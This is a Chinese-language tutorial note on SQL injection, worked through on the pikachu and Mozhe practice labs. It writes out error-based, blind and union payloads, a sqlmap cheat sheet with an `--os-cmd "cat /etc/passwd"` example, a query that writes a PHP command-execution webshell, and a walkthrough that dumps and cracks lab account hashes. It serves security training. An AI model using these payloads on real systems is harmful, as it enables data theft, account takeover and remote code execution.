# SQL注入

**SQL注入原理**

服务器对用户输入的参数没有严格验证过滤，导致攻击者传入的“数据”拼接到程序代码中的SQL语句里，被视作SQL语句的一部分执行，从而导致数据库数据泄露或被篡改

**渗透测试就是多尝试，有输入框都可能出现sql注入**

## 一、SQL注入类型

### 1.1 四种基本类型

#### 1.1.1 数字型注入（post）

数字型正常的SQL查询语句应该是`SELECT * FROM member WHERE id=1;`，非正常查询语句使SQL语句是`SELECT * FROM member WHERE id=1 or 1=1;`，SQL语句的条件判断永远为真，输出所有符合条件的数据。至于SQL语句在哪个库表下执行，这由程序代码决定

![数字型正常查询](E:\github\Web-Penetration\image\SQL注入\数字型正常查询.png)

通过pikachu漏洞联系平台进行测试

1. 浏览器发起查询；需要提前配置好浏览器的代理，使用burpsuite进行抓包

   ![数字型-1](E:\github\Web-Penetration\image\SQL注入\数字型-1.png)

2. 将截取的包转发到重放器

   ![数字型-2](E:\github\Web-Penetration\image\SQL注入\数字型-2.png)

3. 修改请求内容后转发到目标，获取目标用户信息

   ![数字型-3](E:\github\Web-Penetration\image\SQL注入\数字型-3.png)

   在SQL语句中，`#`号表示注释，在此示例中实际上不需要使用注释，通过后端代码即可观察到`id`字段本身就是作为条件判断放在SQL语句的尾部，

后端代码处理如下，代码中没有对获取到的`id`进行任何校验处理，将`id`的值直接赋值到SQL语句中，导致正常查询变成非正常查询

![数字型SQL注入-后台](E:\github\Web-Penetration\image\SQL注入\数字型SQL注入-后台.png)

#### 1.1.2 字符型注入（get）

字符型注入无法直接套用数字型注入的SQL语法，因为所有的输入内容都会转换为字符串，字符型的正常查询语句是`SELECT * FROM member WHERE username="kobe";`，若直接套用数字型注入的输入会变成`SELECT * FROM member WHERE username="kobe or 1=1";`

![字符型正常查询](E:\github\Web-Penetration\image\SQL注入\字符型正常查询.png)

问题出在引号上，因此如果要实现字符型注入，首先需要考虑如何将引号进行主动闭合。此处展示出来的SQL语句使用双引号，但输入数据会先交给后端程序处理，后端程序是否使用单引号犹未可知，因此在实际测试过程中可以单、双引号都进行尝试

1. 浏览器发起查询；在浏览器中主动闭合引号

   ![字符型-1](E:\github\Web-Penetration\image\SQL注入\字符型-1.png)

   此处`#`号注释不可省略，手动闭合的引号只闭合了左半部分的引号，原始的成对的引号还有右半部分，因此需要在输入中屏蔽掉右半部分的引号

2. 后端代码处理

   ![字符型-2](E:\github\Web-Penetration\image\SQL注入\字符型-2.png)

#### 1.1.3 搜索型注入

搜索型SQL语句一般会使用模糊皮牌，与字符型相似的是都需要手动闭合引号，与字符型不同的是搜索型使用了通配符，不是精确匹配字符串。搜索型的正常查询语句是`SELECT * FROM member WHERE username LIKE "%k%";`

![搜索型正常查询](E:\github\Web-Penetration\image\SQL注入\搜索型正常查询.png)

1. 浏览器发起查询；在浏览器中主动闭合引号

![搜索型-1](E:\github\Web-Penetration\image\SQL注入\搜索型-1.png)

2. 后端代码处理

   ![搜索型-2](E:\github\Web-Penetration\image\SQL注入\搜索型-2.png)

#### 1.1.4 XX型注入

相比较前三者，XX型的写法更类似于元组，因此XX型不仅需要解决手动闭合引号的问题，还需要对括号也进行手动闭合，这种类型一般被应用于购物车等场景

1. 浏览器发起查询；在浏览器中主动闭合引号

   ![XX型-1](E:\github\Web-Penetration\image\SQL注入\XX型-1.png)

2. 后端代码处理

   ![XX型-2](E:\github\Web-Penetration\image\SQL注入\XX型-2.png)

### 1.2 三种盲注类型

#### 1.2.1 报错盲注

一个与信息收集类似的概念，系统或程序的报错信息本意是为了便于管理员尽快的排除处理故障，因此报错信息中同样可以输出一些关键信息。报错盲注的方式就是让错误信息中输出攻击者想要的信息，报错盲注提供了很多种函数应用，常见的函数有三个`UPDATEXML()`、`EXTRACTVALUE()`、`FLOOR()`，三者中以`floor()`语句书写复杂度最高，因此用的最少，此处不做演示

- `UPDATEXML(xml_column, xpath_expr, new_value)`函数需要3个必备参数，但实际上在SQL注入的过程中并不需要关心`UPDATEXML()`函数的第一、第三个函数的实际作用，用占位符填写即可

  - `xml_column`：XML 类型的列名

  - `xpath_expr`：XPath 表达式，定位需更新的节点

  - `new_value`：新值（文本或 XML 片段）

  在pikachu的字符型注入中输入`' or updatexml(1,concat(0x7e, version()),0)#`，即可从数据库的报错信息中得到数据库的版本信息，这其中`0x7e`转义为`~`符，它的作用是避免信息不被报错内容覆盖，拼接成一个完整信息为目的

  ![updatexml函数应用](E:\github\Web-Penetration\image\SQL注入\updatexml函数应用.png)

- `EXTRACTVALUE(xml_expression, xpath_expression)`函数需要2个必备参数，在SQL注入的过程中并关心`EXTRACTVALUE()`函数的第一个参数，同样属于占位符

  - `xml_expression`：XML 类型数据，可以是字段名（如`XMLTYPE`列）、XML 文本或转换后的表达式（如`XMLTYPE('<a>test</a>')`）
  - `xpath_expression`：XPath 路径表达式，指定目标节点位置（如 `/root/node/@attr` 提取属性值）

  在pikachu的字符型注入中输入`' or extractvalue(0,concat(0x7e, version()))#`，即可从数据库的报错信息中得到数据库的版本信息，这其中`0x7e`转义为`~`符，它的作用是避免信息不被报错内容覆盖，拼接成一个完整信息为目的

  ![extractvalue函数应用](E:\github\Web-Penetration\image\SQL注入\extractvalue函数应用.png)

#### 1.2.2 布尔盲注

布尔盲注的结果值只有0或1（真和假），因此布尔盲注无法直接获取攻击者想要的信息，但可以通过布尔盲注结合比较运算符的方式逐步推断真实数据。布尔盲注与此前学习的注入类型都不同，布尔盲注需要牢记几个关键函数：`length()`、`substr()`、`ascii()`

- `length()`：可用于获取数据库名称字符长度，数据库名称长度最高为64位字符
- `substr()`：可用于截取字符串
- `ascii()`：将字符转换为ASCII码，ASCII码长度最高为127位

使用布尔盲注具备一个前提条件，需要已经获取到一个已知条件，比如用户名，通过已知条件结合逻辑运算符再逐步判断真实数据

1. 判断数据库名称长度；使用`kobe' and length(database())>5 #`逐步判断数据库名称长度，条件为真时web会输出`kobe`的账户信息，条件为假时web会输出报错信息

   ![布尔盲注-1](E:\github\Web-Penetration\image\SQL注入\布尔盲注-1.png)![布尔盲注-2](E:\github\Web-Penetration\image\SQL注入\布尔盲注-2.png)

2. 逐个截取字符获取数据库名称；使用`kobe' and ascii(substr(database(),1,1)) > 64 #`逐步进行判断，SQL注入练习默认使用的数据库名称为`pikachu`，因此截取到的首位字符是`p`，`p`字符对应ACSII码为112

   ![布尔盲注-3](image\SQL注入\布尔盲注-3.png)![布尔盲注-4](image\SQL注入\布尔盲注-4.png)

#### 1.2.3 时间盲注

如果说布尔盲注是通过能够正确输出用户信息来判断信息是否正确，时间盲注则是通过手动延迟服务端的响应时间来判断信息是否正确，与布尔盲注相同的是，时间盲注也需要具备一个已知条件，通过已知条件进行逻辑运算。时间盲注需要牢记几个参数：`if()`、`substr`、`sleep()`

- `if()`：条件判断语句
- `sleep()`：进程睡眠延时

使用`kobe' and if((substr(database(),1,1))='a',sleep(5),null) #`执行时间盲注，可以通过浏览器的开发者选项看到网页的响应时间，当条件为假时网页即刻就能收到服务端的响应报文，当条件为真时服务端会延时5秒左右进行响应，睡眠时间可以手动进行延长，但需要注意的是，无论条件是否为真，网页的输出内容都会是报错，只能通过响应时间进行判断条件是否为真

![时间盲注-1](E:\github\Web-Penetration\image\SQL注入\时间盲注-1.png)

### 1.3 判断是否存在注入点

#### 1.3.1 拼接查询语句

通过手动调整执行正确的、错误的SQL拼接查询语句，可以判断输入框是否存在注入点。如下测试，虽然输出结果没有标记SQL语句执行报错，但也间接说明了输入框是可以直接与数据库进行交互的。使用拼接查询语句检测注入点的前提是，必须要具备一个已知条件，此示例中使用的用户名`kobe`是此前通过SQL获取到的已知条件，如果没有已知条件无法使用拼接查询语句进行确认注入点

![查询判断注入点-1](E:\github\Web-Penetration\image\SQL注入\查询判断注入点-1.png)![查询判断注入点-2](E:\github\Web-Penetration\image\SQL注入\查询判断注入点-2.png)

#### 1.3.2 特殊符号

输入单个引号或双引号，如果直接出现SQL语法错误的关键词，代表着输入框可以直接与数据库进行交互

![符号判断注入点](E:\github\Web-Penetration\image\SQL注入\符号判断注入点.png)

### 1.4 扩展

#### 1.4.1 联合查询

使用SQL联合查询语句更直观的获取有效信息，但联合查询字段需要跟主查询保持一致，如果主查询只查了两个字段信息，联合查询一次也只能输出两个字段信息，输入`' union select user(), version() #`查询

![联合查询](E:\github\Web-Penetration\image\SQL注入\联合查询.png)

#### 1.4.2 insert/update注入

SQL注入的类型只有7种，但注入的手法从无上限，在了解注入手法前，需要先知晓INSERT、UPDATE等SQL语句的语法规则应如何书写，以INSERT语法为例：`INSERT INTO TABLE(username, password) VALUE('name', 'pass');`，这两种SQL语句一般应用在注册用户、更新用户信息等场景

1. 通过`'`号'测试是否存在注入点

   ![insert手法-1](E:\github\Web-Penetration\image\SQL注入\insert手法-1.png)![insert手法-2](E:\github\Web-Penetration\image\SQL注入\insert手法-2.png)

2. 使用报错盲注获取数据库信息

   在输入框写入`' or updatexml(1,concat(0x7e, version()),0) or '`，将这段内容引入到INSERT语法示例中就变成了：`INSERT INTO table_name(username, password) VALUE('' or updatexml(1,concat(0x7e, version()),0) or '', 'pass');`，可以预见的是这段SQL语句一定会报错，但只要报错信息能够获取到目标信息即达成目的

   ![insert手法-3](E:\github\Web-Penetration\image\SQL注入\insert手法-3.png)

#### 1.4.3 delete注入

使用SQL语句执行删除操作时一般都需要使用一个具备唯一性的判断条件，以MySQL的DELETE语句为例：`DELETE FROM table_name WHERE id=1;`，这个具备唯一性的判断条件一般会是一个整数类型，整数不需要手动闭合引号

1. 随机删除一条数据；在删除前需要通过burpsuite进行抓包

   ![delete手法-1](E:\github\Web-Penetration\image\SQL注入\delete手法-1.png)

2. 将截取的包转发到重放器

   ![delete手法-2](E:\github\Web-Penetration\image\SQL注入\delete手法-2.png)

3. 修改数据包信息；需要注意，在使用GET方法的情况下，首行数据会被附加到浏览器的URL路径中，浏览器的URL路径必须使用URL编码，因此在转发之前必须先对修改语句进行一次URL转码

   ![delete手法-3](E:\github\Web-Penetration\image\SQL注入\delete手法-3.png)

4. 获取目标信息

   ![delete手法-4](E:\github\Web-Penetration\image\SQL注入\delete手法-4.png)

#### 1.4.4 http头部注入

使用http头部注入手法的前提是需要先具备账号登录站点，登录站点后通过burpsuite对数据包的请求头数据进行修改

1. 通过pikachu的提示信息登录站点

   ![header手法-1](E:\github\Web-Penetration\image\SQL注入\header手法-1.png)

2. 启用burpsuite抓包后刷新网页，将捕获到的报文转发到重放器

   ![header手法-2](image\SQL注入\header手法-2.png)

3. 第一种方式：修改User-Agent值为：`' or updatexml(1,concat(0x73, version()),0) or '`，获取数据库版本信息

   ![header手法-3](image\SQL注入\header手法-3.png)

4. 第二种方式：在Cookie字段的账户名后追加：` and extractvalue(0,concat(0x7e, database())) #`，获取数据库名称

   ![header手法-4](image\SQL注入\header手法-4.png)

#### 1.4.5 宽字节注入

宽字节注入用于利用数据库字符编码特性来绕过转义机制，后端程序对用户输入的引号添加反斜杠转义，这种情况下可以尝试使用宽字节注入手法。宽字节注入手法只能应用在后端使用GBK编码的场景下，在GBK编码下一个汉字由两个字节组成（如 `%DF%5C` 对应汉字“運”），而ASCII字符仅占一个字节，在ASCII字符中`\`对应`%5C`、`'`对应`%27`，那么攻击者在使用单引号之前先注入一个高位字节（如 `%DF`），与转义符 `%5C` 组合成合法宽字符，那么原本的`%5C%27`就会变为`%DF%5C`剩余一个`%27`逃逸。显示的展现形式就从`\'`变为了`運'`

1. 浏览器注入；注入前使用burpsuite进行抓包

   ![宽字节注入-1](E:\github\Web-Penetration\image\SQL注入\宽字节注入-1.png)

2. 在burpsuite上将数据转发到重放器，查看万能注入语法的结果

   ![宽字节注入-2](image\SQL注入\宽字节注入-2.png)

3. 使用宽字节注入

   ![宽字节注入-3](image\SQL注入\宽字节注入-3.png)

#### 1.4.6 写入数据

一句话木马可以简单便捷的实现攻击者对目标的远程控制，SQL注入可直接实现从创建文件到写入代码，但通过SQL注入写入并利用一句话木马需要具备3个前提条件：

1. 需要知晓服务端远程目录
2. 需要远程目录下具备写入权限
3. 需要数据库启用`secure_file_priv`参数

通过`SHOW VARIABLES LIKE '%secure%';`语句可查询`secure_file_priv`参数是否处于启用状态，查询结果显示为`NULL`或`OFF`都代表处于关闭状态，修改`secure_file_priv`参数状态需要重启数据库服务

1. 通过字符型注入写入一句话木马

   使用`' union select "<?php system($_GET['cmd']);?>",2 into outfile "E:/phpstudy_pro/WWW/pikachu/muma.php"#`在指定路径下生成木马文件，虽然产生警告，但仍写入成功

   ![](image\SQL注入\SQL注入木马-1.png)

2. 通过网页控制目标

   ![SQL注入木马-2](image\SQL注入\SQL注入木马-2.png)

## 二、自动化工具

### 2.1 sqlmap

#### 2.1.1 基本测试

1. GET 参数注入

   ```bash
   sqlmap -u "http://target.com/page.php?id=1"
   ```

2. POST 请求注入

   ```bash
   sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"
   ```

3. Cookie 注入（需登录态）

   ```bash
   sqlmap -u "http://target.com/protected.php" --cookie="PHPSESSID=xxx"
   ```

4. 静态请求文件（Burp 抓包导出）

   ```bash
   sqlmap -r request.txt
   ```

#### 2.1.2 数据库信息收集

| 命令                 | 功能                           | 示例                                                      |
| -------------------- | ------------------------------ | --------------------------------------------------------- |
| --banner             | 获取数据库版本信息             | sqlmap -u "url?id=1" --banner                             |
| --current-db         | 获取当前数据库名               | sqlmap -u "url?id=1" --current-db                         |
| --dbs                | 列出所有数据库                 | sqlmap -u "url?id=1" --dbs                                |
| -D 数据库名 --tables | 列出指定数据库的表             | sqlmap -u "url?id=1" -D mysql --tables                    |
| -T 表名 --columns    | 列出表的字段                   | sqlmap -u "url?id=1" -D mysql -T user --columns           |
| -C 字段名 --dump     | 导出字段数据                   | sqlmap -u "url?id=1" -D mysql -T user -C User,Host --dump |
| --os-cmd             | 直接执行操作系统命令           | sqlmap -u "url?id=1" --os-cmd "cat /etc/passwd"           |
| --is-dba             | 检测当前账户是否为数据库管理员 | sqlmap -u "url?id=1" --is-dba                             |

使用`--os-cmd`执行操作系统命令需要具备三个前提条件

1. 当前账户为数据库管理员账户，通过`--is-dba`进行检测
2. 数据库支持堆查询或特定函数
3. 目标Web程序需允许执行多语句

## 三、手工注入

使用手工注入的场景可能不如自动化工具的使用场景多了，但还是需要根据手工注入的过程来了解一下自动化工具的注入流程。手工注入实验使用MySQL数据库进行测试，可以直接使用[墨者学院](https://mozhe.cn/)的在线实验环境，在手工注入之前首先需要了解一下MySQL的一些特性。在MySQL 5.0以上版本中，MySQL存在一个缺省库，名为information_schema，在这个库中存储了MySQL上已创建的所有的库名、表名、列名，可以理解为是整个MySQL的元数据，通过查询它可以获取某一个库下面的表名或列名信息

在information_schema库中存在几个关键表和字段名

- table_schema：库名
- table_name：表名
- column_name：列名（字段名）
- information_schema.schemata：记录MySQL所有库名的表
- information_schema.tables：记录MySQL所有表名的表
- information_schema.columns：记录MySQL所有列名的表

手工注入实验以墨者学院的在线环境进行测试：

1. 检查首页

   ![手工注入-1](image\SQL注入\手工注入-1.png)

   拿到一个Web页面，首先需要检测其页面是否存在常见默认账号、弱密码，其次再尝试寻找注入点，任何输入框、地址栏都有可能出现注入点，包括超链接的地址栏同样如此。通过账号密码的输入框进行符号测试（`'`'）和万能语句（`' or 1=1 #`）测试都没有明显异常，包括点击登录后的连接地址也无明显异常，通过滚动条的超链接URL可初现端倪

   ![手工注入-2](image\SQL注入\手工注入-2.png)

2. 检测是否存在注入点

   `id=1`字段大概率可能是SQL语句中的条件判断，因此下一步使用符号对地址栏进行注入点检测，符号测试导致页面内容不可见，说明此处存在注入点

   ![手工注入-3](image\SQL注入\手工注入-3.png)

3. 通过`ORDER BY`语法测试当前数据库的字段范围

   当`ORDER BY`条件为真时，Web页面不会产生任何变化，当`ORDER BY`条件为假时，Web页面内容异常。在此示例中`ORDER BY`最高到5时条件为假，意味着当问Web页面所属的表中最多有4个字段。需要注意，由于`id`字段是数字型，因此在使用`ORDER BY`条件之前不需要添加引号

   ![手工注入-4](image\SQL注入\手工注入-4.png)

4. 通过联合查询查看可用的输出点

   当`id=1`时代表数据库中存在此`id`值，因此能够正常看到Web页面，在`id`关键后面追加联合查询语句，然后使`id`本身成为一个假条件或添加一个假条件，迫使数据库执行联合查询语句，输出期望值

   ![手工注入-5](image\SQL注入\手工注入-5.png)

   此处使`id`成为一个假条件（比如`id=-1`）也可以，但在未知情况下`and 1=2`似乎能够更稳定实现条件为假的效果。`select 1,2,3,4`这条语句在这个场景下全部都是占位符，并没有实际意义，他的作用就是查看哪几个位置的信息会在Web页面上直接展示出来，结果很明显，是第2位和第3位能够展示

5. 调整联合查询的展示位逐步获取库表信息

   - database()：用于查询当前数据库名称
   - version()：用于查询数据库版本
   - user()：用于查询数据库用户
   - @@version_compile_os：用于查询操作系统类型

   ![手工注入-6](image\SQL注入\手工注入-6.png)

   已获取信息：

   - 库名：mozhe_Discuz_StormGroup
   - 当前用户：root@localhost，此用户大概率就意味着最高权限

6. 查询`mozhe_Discuz_StormGroup`下的表

   使用联合查询语句`http://124.70.64.48:43496/new_list.php?id=1 and 1=2 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema="mozhe_Discuz_StormGroup"`查询当前库下的所有表，查询语句的第3位暂时不用恢复为编号3，`GROUP_CONCAT()`函数的作用是为了一次输出所有的查询到的表名，查询存在多个结果的情况下，Web页面中默认只会展示首个查询结果

   ![手工注入-7](image\SQL注入\手工注入-7.png)

   目前已知的表：

   - StormGroup_member
   - notice

7. 尽可能条件符合存储用户信息的表，查看其字段

   member直译为成员，先查看StormGroup_member表的字段：`and 1=2 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name="StormGroup_member"`

   ![手工注入-8](image\SQL注入\手工注入-8.png)

8. 根据库、表名查询实际数据

   ![手工注入-9](image\SQL注入\手工注入-9.png)

9. 借助工具尽可能解密MD5；复杂的密码基本上不存在解密的希望

   ![手工注入-10](image\SQL注入\手工注入-10.png)

10. 尝试登录站点

   使用`mozhe/dsan13`尝试从首页登录站点，出现异常提示，从数据库中查询到的账户被禁用。在找到注入点并能够执行查询语句时，可以尝试查询下前两个账户密码，如果都有异常，可以查询下用户信息表的总行数，确认下大概的数据量再决定下一步动作

   ![手工注入-11](image\SQL注入\手工注入-11.png)

11. 查询其他账户

    通过`LIMIT`进行逐行过滤，查询结果存在多行数据时默认只输出首行，但首行数据异常时就需要逐步查看其他行数据，`LIMIT`语句默认下标索引从0开始，也就是说查询第二行数据时需要从1开始

    ![手工注入-12](image\SQL注入\手工注入-12.png)

    对新的密文在进行一次解密即可获取正确账号密码



